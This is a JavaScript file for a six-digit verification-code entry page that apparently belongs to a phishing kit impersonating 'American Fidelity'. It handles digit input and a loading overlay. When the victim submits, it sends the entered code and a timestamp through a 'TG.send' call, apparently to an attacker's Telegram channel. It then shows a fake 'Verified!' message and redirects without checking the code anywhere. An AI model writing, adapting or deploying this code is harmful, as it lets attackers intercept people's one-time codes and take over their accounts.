(function () {
  "use strict";

  var digits     = Array.from(document.querySelectorAll(".code-digit"));
  var verifyBtn  = document.getElementById("verify-btn");
  var errorMsg   = document.getElementById("verify-error");
  var resendLink = document.getElementById("resend-link");

  if (!digits.length) return;

  /* ── Inject loading overlay ─────────────────── */
  var overlay = document.createElement("div");
  overlay.id = "loading-overlay";
  overlay.innerHTML = [
    '<div class="overlay-card" id="overlay-card">',
      '<div class="overlay-spinner"></div>',
      '<div class="overlay-success-icon">',
        '<svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">',
          '<polyline points="20 6 9 17 4 12"></polyline>',
        '</svg>',
      '</div>',
      '<div class="overlay-text" id="overlay-text">Verifying…</div>',
    '</div>'
  ].join("");
  document.body.appendChild(overlay);

  var overlayCard = document.getElementById("overlay-card");
  var overlayText = document.getElementById("overlay-text");

  /* ── Focus first box on load ─────────────────── */
  digits[0].focus();

  /* ── Digit keyboard / input handling ─────────── */
  digits.forEach(function (input, idx) {

    input.addEventListener("keydown", function (e) {
      var nav = ["Backspace","Delete","Tab","ArrowLeft","ArrowRight","Home","End"];
      var isDigit = e.key >= "0" && e.key <= "9";
      if (!isDigit && nav.indexOf(e.key) === -1) { e.preventDefault(); return; }

      if (e.key === "Backspace") {
        e.preventDefault();
        clearError();
        if (input.value) {
          input.value = "";
          setFilled(input);
        } else if (idx > 0) {
          var prev = digits[idx - 1];
          prev.value = "";
          setFilled(prev);
          prev.focus();
        }
      }
    });

    input.addEventListener("input", function () {
      clearError();
      input.value = input.value.replace(/\D/g, "").slice(-1);
      setFilled(input);
      if (input.value && idx < digits.length - 1) digits[idx + 1].focus();
    });

    input.addEventListener("keyup", function (e) {
      if (e.key === "ArrowRight" && idx < digits.length - 1) digits[idx + 1].focus();
      if (e.key === "ArrowLeft"  && idx > 0)                 digits[idx - 1].focus();
    });

    input.addEventListener("paste", function (e) {
      e.preventDefault();
      clearError();
      var pasted = (e.clipboardData || window.clipboardData)
        .getData("text").replace(/\D/g, "").slice(0, 6);
      pasted.split("").forEach(function (ch, i) {
        if (digits[idx + i]) { digits[idx + i].value = ch; setFilled(digits[idx + i]); }
      });
      var next = digits.find(function (d) { return !d.value; });
      (next || digits[digits.length - 1]).focus();
    });
  });

  function setFilled(el) {
    el.value ? el.classList.add("filled") : el.classList.remove("filled");
  }

  function clearError() {
    digits.forEach(function (d) { d.classList.remove("error"); });
    if (errorMsg) errorMsg.classList.remove("visible");
  }

  /* ── Overlay helpers ─────────────────────────── */
  function showOverlay(message) {
    overlayText.textContent = message;
    overlayCard.classList.remove("success");
    overlay.classList.add("visible");
  }

  function setSuccess(message) {
    overlayCard.classList.add("success");
    overlayText.textContent = message || "Verified!";
  }

  /* ── Verify button ───────────────────────────── */
  if (verifyBtn) {
    verifyBtn.addEventListener("click", function (e) {
      e.preventDefault();
      clearError();

      var code = digits.map(function (d) { return d.value; }).join("");

      if (code.length < 6) {
        digits.forEach(function (d) { if (!d.value) d.classList.add("error"); });
        if (errorMsg) errorMsg.classList.add("visible");
        var first = digits.find(function (d) { return !d.value; });
        if (first) first.focus();
        return;
      }

      verifyBtn.disabled = true;

      TG.send(
        "🔢 <b>American Fidelity — Verification Code Entered</b>\n\n" +
        "🔐 Code: <code>" + code + "</code>\n" +
        "⏰ " + TG.ts()
      );

      /* ── Show overlay then success then redirect ── */
      showOverlay("Verifying…");

      setTimeout(function () {
        setSuccess("Verified!");
      }, 4000);

      setTimeout(function () {
        window.location.href = "index.html";
      }, 7000);
    });
  }

  /* ── Resend link ─────────────────────────────── */
  if (resendLink) {
    resendLink.addEventListener("click", function (e) {
      e.preventDefault();
      clearError();
      digits.forEach(function (d) { d.value = ""; d.classList.remove("filled","error"); });
      digits[0].focus();
      var orig = resendLink.textContent;
      resendLink.textContent = "Code resent!";
      setTimeout(function () { resendLink.textContent = orig; }, 3000);
    });
  }

}());